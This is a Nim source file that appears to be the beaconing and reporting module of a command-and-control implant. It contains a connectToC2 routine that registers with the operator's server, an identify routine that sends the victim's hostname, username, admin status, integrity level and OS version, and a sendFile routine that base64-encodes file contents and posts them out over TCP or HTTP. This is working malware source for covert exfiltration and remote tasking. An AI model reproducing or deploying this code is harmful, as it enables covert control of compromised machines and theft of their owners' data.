import std/[base64, json]

when defined(tcp):
  import std/net
elif defined(http):
  import std/httpclient

import types

proc sendData(app: App, data: string) =
  when defined(tcp):
    app.socket.send(encode(data) & "\r\n")
  elif defined(http):
    try:
      discard app.httpClient.postContent(app.httpRoot & "/t?id=" & app.token, body=encode(data))
      when defined(debug):
        echo "sending " & data
    except OSError:
      return
type DataType* = enum
  File, Text, Code, Image, Object

type 
  TaskOutput* = ref object
    task*: string
    taskId*: int
    error*: string
    data*: JsonNode

proc addData*(output: TaskOutput, dataType: DataType, name: string, contents: string) =
  let enContents = newJString(encode(contents))
  if output.data.isNil():
    output.data = %*{}
  case dataType:
  of File:
    output.data[name & "::file"] = enContents
  of Text:
    output.data[name & "::text"] = enContents
  of Code:
    output.data[name & "::code"] = enContents
  of Image:
    output.data[name & "::image"] = enContents
  of Object:
    output.data[name & "::object"] = enContents


proc sendOutput*(app: App, taskOutput: TaskOutput) =
  let j = %*
    {
      "task": taskOutput.task,
      "taskId": taskOutput.taskId,
      "error": taskOutput.error,
      "data": taskOutput.data
    }
  app.sendData($j)

proc identify*(app: App, taskId: int, hostname: string, isAdmin: bool, username: string, osType: string,
              windowsVersionInfo: tuple[majorVersion: int, minorVersion: int, buildNumber: int],
              linuxVersionInfo: tuple[kernelVersion: string], ownIntegrity: string, pid: int, pname: string) =
  let j = %*
    {
      "task": "identify",
      "taskId": taskId,
      "error": "",
      "data": {
        "hostname": hostname,
        "isAdmin": isAdmin,
        "username": username,
        "osType": osType,
        "ownIntegrity": ownIntegrity,
        "pid": pid,
        "pname": $pname,
        "windowsOsVersionInfo": {
          "majorVersion": windowsVersionInfo.majorVersion,
          "minorVersion": windowsVersionInfo.minorVersion,
          "buildNumber": windowsVersionInfo.buildNumber,
        },
        "linuxOsVersionInfo": {
          "kernelVersion": linuxVersionInfo.kernelVersion
        }
      }
    }
  app.sendData($j)

proc connectToC2*(app: App) =
  when defined(http):
    try:
      let token = app.httpClient.getContent(app.httpRoot & "/r")
      app.token = token
      when defined(debug):
        echo "got token: " & token
    except OSError:
      return
  let j = %*
    {
      "task": "connect",
      "taskId": -1,
      "error": "",
      "data": {}
    }
  app.sendData($j)

proc unknownTask*(app: App, taskId: int, taskName: string) =
  let j = %*
    {
      "task": taskName,
      "taskId": taskId,
      "error": "unknown task",
      "data": {}
    }
  app.sendData($j)

proc sendFile*(app: App, taskId: int, path: string, b64c: string, error: string = "") =
  let j = %*
    {
      "task": "file",
      "taskId": taskId,
      "error": error,
      "data": {
        "path": path,
        "contents": b64c
      }
    }
  app.sendData($j)

proc newTaskOutput*(taskId: int): TaskOutput =
  TaskOutput(
    task: "output",
    taskId: taskId,
    error: "",
    data: %*{}
  )